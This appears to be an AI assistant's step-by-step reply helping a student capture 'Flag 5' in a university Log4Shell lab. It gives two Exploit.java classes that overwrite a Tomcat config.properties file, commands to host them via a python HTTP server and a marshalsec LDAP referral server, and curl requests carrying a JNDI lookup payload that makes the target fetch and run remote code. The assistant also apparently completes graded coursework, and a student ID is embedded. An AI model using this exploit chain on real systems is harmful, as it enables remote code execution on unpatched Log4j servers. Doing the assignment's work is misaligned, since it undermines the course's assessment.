Current Progress and Next Steps
What we've achieved so far:

We've identified that to get Flag 5, we need to:

Change the topic in config.properties from "user.info" to "user.account"
Include your GATECH_ID (904074283) as the account number in the published message


We've created an Exploit.java file that attempts to overwrite the config.properties file:
javaCopyimport java.io.File;
import java.io.FileOutputStream;
import java.util.Properties;

public class Exploit {
    public Exploit() {
        try {
            Properties props = new Properties();
            props.setProperty("customer.service.email", "customerservice@gatech.edu");
            props.setProperty("topic.name", "user.account");
            props.setProperty("rating", "PG");
            
            File file = new File("/opt/tomcat/webapps/ROOT/config.properties");
            FileOutputStream fos = new FileOutputStream(file);
            props.store(fos, null);
            fos.close();
            
            System.out.println("Successfully overwritten config.properties to use user.account");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        new Exploit();
    }
}

We've set up the HTTP and LDAP servers to deliver this exploit
We've attempted various curl commands to trigger the Log4j exploit and pass your GATECH_ID

The challenge we're facing:
The config.properties file isn't being successfully overwritten, or the application isn't reading the updated file. We're still seeing messages going to "user.info" instead of "user.account".
Next steps to get the flag:

Restart the environment for a clean slate:
Copy./StopContainer.sh
./StartContainer.sh

Restart both servers with our optimized Exploit.java:

Make sure you're in the Flag5 directory
Recompile: javac Exploit.java
Start HTTP server: python3 -m http.server 8888
Start LDAP server: java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Exploit" 4444


Try a modified curl command that focuses on including the GATECH_ID in multiple ways:
Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:4444/Exploit}", "accountNum":"904074283"}'

Check the logs after running the curl command to see:

If the LDAP server was contacted
If the config.properties file was modified
Which topic is being used for publishing


Try a follow-up curl command to verify if the topic has changed:
Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"accountNum":"904074283"}'


If the flag still isn't coming through, we may need to look deeper at the exact pattern being used in the application for setting the account number.



method 2 ---


I see that we still have some challenges. Let's go back to our original approach but with a better understanding of what's going on:

We need to change the topic from "user.info" to "user.account" in the config.properties file
We need to make sure our GATECH_ID (904074283) is included as the account number

Let's try a slightly different approach. Since the Log4j exploit seems to be working (the LDAP server is redirecting properly), but something is going wrong with updating the config.properties file, let's try a different Exploit.java file:
Step 12: Update our Exploit.java file with a more targeted approach
Copycd ~/Desktop/log4shell/Flag5
Create a new Exploit.java file:
javaCopyimport java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Properties;

public class Exploit {
    public Exploit() {
        try {
            // Try multiple paths to cover all possibilities
            String[] possiblePaths = {
                "/opt/tomcat/webapps/ROOT/config.properties",
                "/usr/local/tomcat/webapps/ROOT/config.properties",
                "/usr/local/tomcat/config.properties",
                "/opt/tomcat/config.properties",
                "/config.properties"
            };
            
            // Try each path
            for (String path : possiblePaths) {
                File file = new File(path);
                if (file.exists()) {
                    System.out.println("Found config.properties at: " + path);
                    
                    // Read existing properties
                    Properties props = new Properties();
                    FileInputStream fis = new FileInputStream(file);
                    props.load(fis);
                    fis.close();
                    
                    // Print current properties
                    System.out.println("Current properties: " + props);
                    
                    // Update property
                    props.setProperty("topic.name", "user.account");
                    
                    // Write back
                    FileOutputStream fos = new FileOutputStream(file);
                    props.store(fos, null);
                    fos.close();
                    
                    System.out.println("Successfully updated config.properties to use user.account");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        new Exploit();
    }
}
Compile:
Copyjavac Exploit.java
Run the servers again (if they're not already running):
Copy# In one terminal (make sure you're in the Flag5 directory):
python3 -m http.server 8888

# In another terminal (from the target directory):
java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Exploit" 4444
Then trigger the exploit:
Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:4444/Exploit}", "accountNum":"904074283"}'
After running this, try a follow-up curl command to see if we can trigger a message to the user.account topic:
Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"user1", "accountNum":"904074283"}'
